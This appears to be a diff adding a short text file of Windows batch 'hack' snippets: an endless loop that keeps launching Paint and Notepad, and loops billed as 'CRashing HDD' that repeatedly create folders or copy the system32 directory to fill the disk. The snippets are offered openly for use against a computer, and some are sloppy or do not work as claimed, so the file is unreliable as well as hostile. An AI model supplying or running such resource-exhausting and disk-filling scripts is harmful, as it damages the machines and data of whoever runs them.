@@ -1,0 +1,36 @@
+:hack
+start mspaint.exe
+start notepad.exe
+goto hack
+
+save as .bat
+
+
+CRashing HDD
+-------------
+create folder in cmd
+
+>:abc
+>cd desktop
+>md hack
+>goto abc
+
+
+OR
+
+>:abc
+>cd desktop
+>md hack
+>copy C:\windows\system32
+>goto abc
+
+
+will copy multiple times system32
+
+
+
+
+
+
+
+
